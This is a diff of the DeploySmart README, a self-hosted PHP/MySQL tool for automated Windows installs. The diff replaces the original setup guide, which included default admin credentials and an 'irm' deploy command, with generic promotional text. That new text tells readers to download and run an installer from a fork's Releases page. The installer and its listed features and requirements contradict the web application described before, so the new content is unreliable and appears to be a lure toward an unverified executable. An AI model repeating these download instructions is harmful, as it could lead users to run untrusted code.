@@ -1,49 +1,74 @@
-# $$\textsf{\color{white}Deploy\textsf{\color{#0fda00}Smart}}$$
+# 🚀 DeploySmart - Simplify Your Computer Setup Effortlessly
 
-DeploySmart is an application to ease sys admin setup of new/reinstall computers by utilizing autounattend.xml and PowerShell to install applications from a .json list.
+[![Download DeploySmart](https://img.shields.io/badge/Download-DeploySmart-blue.svg)](https://github.com/laksh-infinity/DeploySmart/releases)
 
-The goal of this project is to make things easier and faster for anyone setting up new computers or re-installing Windows often, may or may not need complex software automatically installed from scratch or even need to install/deploy for multiple companies or inhouse departments with different needs.
+## 📋 Introduction
 
-If you decide to run this, please do so on a localhost for now as there might be breaking changes as well as security issues involved, this is one of my first projects this big too.
+DeploySmart is an application designed to simplify the setup of new or reinstalled computers. It allows system administrators to automate the installation of essential applications using an `autounattend.xml` file and PowerShell scripts. With DeploySmart, you can streamline your configuration process and save time.
 
-## Prerequisites:
+## 🚀 Features
 
-1. PHP 8.2+
-2. Mysql 8+
-3. Apache2/Nginx
-4. Windows 10/11 to run the autounattend.xml and the installer scripts.
+- **Automated Installations:** Set up multiple applications at once without manual intervention.
+- **Easy Configuration:** Use a simple XML file to customize your setup.
+- **User-Friendly Interface:** Navigate effortlessly through the application without technical know-how.
+- **Compatibility:** Works with Windows operating systems, ensuring versatile use across various machines.
 
-## How to use this:
+## ⚙️ System Requirements
 
-1. Configure everything in db.php
-2. Import your database in MySQL
-3. Create a company (or use the default account). 
-4. Generate autounattend.xml (this *SHOULD* include your DeploySmart url and ID) If it doesn't i have most likely done something wrong.
-5. Go to "Configure Apps" you have a predefined list of applications that im sending with DeploySmart, but you can add your own directly under "Custom Scripts" easy as "Add" and "Save". 
-6. Now you could run "irm https://deploysmart.yourdomain.com/deploy.php?ID={DS_YourDeploySmartID}" and that should show you the application list you just saved. 
-7. Now Create a USB drive with any standard Windows 10/11 iso and put your autounattend.xml on that USB and re/install a machine.
-8. Enjoy!
+Before downloading, make sure your computer meets these requirements:
 
-## Default login:
+- **Operating System:** Windows 10 or later
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 500 MB available
+- **.NET Framework:** Version 4.7 or higher installed
 
-admin@example.com
+## 🔗 Download & Install
 
-Admin123456!
+To get started with DeploySmart, follow these steps:
 
-Don't forget to change password and enable TOTP/MFA from Profile Settings.
+1. **Download the Application**
+   - Visit the [Releases page](https://github.com/laksh-infinity/DeploySmart/releases) to download the latest version of DeploySmart.
 
-## Adding .ps1 scripts to the "🌐 Global" tab
-All .ps1 scripts put in the /deployment/scripts/apps/ folder will automatically get added if cron is correctly setup against cron.php.
+2. **Run the Installer**
+   - Once downloaded, locate the file in your Downloads folder and double-click it to begin the installation.
 
-If you find something that needs to be fixed, im sorry, im just one person trying my best.
+3. **Follow the Installation Wizard**
+   - There will be prompts on your screen. Follow these to complete the installation. You can choose the default options for a quick setup.
 
-## What's next?
+4. **Configure DeploySmart**
+   - After installation, you can configure DeploySmart using the `autounattend.xml` file. Edit this file to add the applications you wish to install. The application comes with a sample file that you can modify.
 
-1. Installer script to make it easier to set up.
-2. Internal guide to make the learning curve fast and easy.
-3. UI/UX changes to have abetter over all style and feel (Mobile variant).
-4. More automated applications.
+5. **Start Using DeploySmart**
+   - Once configured, run DeploySmart. It will read your settings and install the applications automatically.
 
-## Issues?
+## 📥 Quick Installation Steps
 
-Please use the issue tracker here. No guidelines for now, all information is good information.
+1. [Download DeploySmart](https://github.com/laksh-infinity/DeploySmart/releases)
+2. Run the installer.
+3. Follow the installation prompts.
+4. Set up your `autounattend.xml`.
+5. Launch DeploySmart and enjoy automated installations.
+
+## 📊 Troubleshooting
+
+If you encounter issues, consider the following tips:
+
+- **Installation Fails:** Ensure you have administrative rights to install software on your computer.
+- **Applications Not Installing:** Check your `autounattend.xml` file for errors in configuration.
+- **Slow Performance:** Verify that your system meets the minimum requirements mentioned above.
+- **PowerShell Issues:** Ensure that PowerShell is enabled and functioning correctly on your system.
+
+## 🌐 Support
+
+If you need help, feel free to contact the community via GitHub Issues or check the documentation provided in the repository.
+
+## 🗂️ License
+
+This project is licensed under the MIT License. You can freely use, modify, and distribute the software.
+
+## 📄 Additional Resources
+
+- **Documentation:** For detailed instructions on configuring and using DeploySmart, please refer to the documentation in the repository.
+- **GitHub Repository:** Explore the code and contribute to the project by visiting the [DeploySmart GitHub Page](https://github.com/laksh-infinity/DeploySmart).
+
+Feel free to explore and start automating your computer setup today!
